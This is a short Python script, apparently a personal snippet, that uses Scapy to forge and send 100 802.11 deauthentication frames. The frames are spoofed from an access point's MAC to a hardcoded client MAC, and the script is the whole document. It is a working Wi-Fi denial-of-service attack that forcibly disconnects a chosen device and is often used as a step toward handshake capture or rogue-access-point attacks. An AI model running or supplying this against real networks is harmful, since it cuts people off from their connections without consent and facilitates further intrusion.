from scapy.all import *

one_nord = "5c:17:cf:9a:36:2f"
Error404 = "10:5A:F7:0F:5F:10"
trala = "88:D7:F6:2A:5D:4D"

# 802.11 frame
# addr1: destination MAC
# addr2: source MAC
# addr3: Access Point MAC
dot11 = Dot11(addr1=one_nord, addr2=Error404, addr3=Error404)
# stack them up
packet = RadioTap()/dot11/Dot11Deauth(reason=7)
# send the packet
sendp(packet, inter=0.1, count=100, iface="wlan1", verbose=1)